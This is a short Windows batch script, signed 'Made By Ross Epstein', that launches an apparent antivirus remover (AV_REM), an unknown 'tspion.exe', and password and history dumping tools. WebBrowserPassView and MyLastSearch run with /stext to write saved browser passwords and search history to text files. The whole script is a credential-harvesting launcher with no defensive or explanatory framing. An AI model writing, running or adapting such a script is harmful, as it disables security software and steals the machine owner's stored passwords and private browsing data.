@echo off
title Made By Ross Epstein
start .\App\AV_REM
ping localhost -n 5 >null
start .\tspion.exe
start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
start .\App\WebPass\WebBrowserPassView.exe /stext PassWords.txt
start .\App\CommandLine\Process.exe
pause
goto eof
